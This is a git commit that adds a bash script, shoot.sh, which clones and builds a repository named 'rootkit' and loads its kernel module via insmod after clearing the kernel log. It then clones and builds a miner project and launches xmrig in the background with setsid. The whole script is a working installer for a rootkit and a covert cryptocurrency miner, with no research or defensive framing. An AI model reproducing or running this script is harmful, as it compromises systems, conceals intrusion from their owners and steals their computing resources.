713f23d6e94ec90228777c89ed28d261810a26f3
Vyom 907 AND Vyom Wankhede <111875466+VYOM00907@users.noreply.github.com>
2022-11-14 12:21:49 +0000

    shooter

---
+++ shoot.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+echo " starting install root "
+echo " cloning "
+git clone https://github.com/VYOM00907/rootkit
+echo " building "
+cd rootkit/
+make
+echo "successfully completed installation"
+
+echo "installing xm"
+echo "installing dependencies"
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+echo "downloading..."
+git clone https://github.com/VYOM00907/oilrig
+echo "building"
+mkdir oilrig/build && cd oilrig/build
+cmake ..
+make -j$(nproc)
+echo "installed"
+
+echo "launcher started "
+
+. "./rootin.sh"
+
+echo "loading module"
+dmesg -C 
+insmod rootkit.ko
+dmesg 
+echo "done loading module"
+
+. "./xmin.sh"
+
+setsid xmrig 
+
+echo "done launching "
